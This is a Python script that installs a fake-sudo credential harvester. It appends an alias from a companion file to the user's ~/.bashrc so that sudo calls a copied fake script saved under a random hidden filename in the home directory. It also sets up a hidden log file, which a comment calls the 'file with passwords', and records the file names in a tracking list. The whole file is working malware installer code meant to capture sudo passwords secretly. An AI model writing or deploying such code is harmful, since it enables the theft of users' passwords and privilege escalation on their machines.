#! /usr/bin/python
# -*- coding: UTF-8 -*-
import os
from random import choice
from string import letters




def generateRandomText(lng, begining = ""):
	text = begining
	
	for x in range(lng):
		text += choice(letters)
	return text



home = os.getenv("HOME")

fakeSudoFilename = generateRandomText(6, ".")  # filename for fakesudo.py

sudoLoc = home + "/" + fakeSudoFilename		   # location for previous

fakeLogFilename = generateRandomText(6, ".")   # filename for logfile - file with passwords
logLoc = home + "/" + fakeLogFilename




###  inject alias code into bashrc from sud.sh
with open("sud.sh", "r") as file:
	data = file.read()
	
rdata = data.replace("--fake--", sudoLoc)

with open( home + "/.bashrc", "a") as file:
	file.write(rdata)
	
	
	
### Copy fakesudo.py to home dir:
	

with open("fake.py", "r") as file:
	data = file.read()
	
rdata = data.replace("--catched--", logLoc)

with open(sudoLoc, "w") as file:
	file.write(rdata)




with open("logNames", "a") as ffile:
	logLine = "%s|%s|%s" % (fakeSudoFilename, fakeLogFilename, home)
	ffile.write(logLine + "\n")


print("Script was written to %s password will be stored at %s" % (fakeSudoFilename, fakeLogFilename))





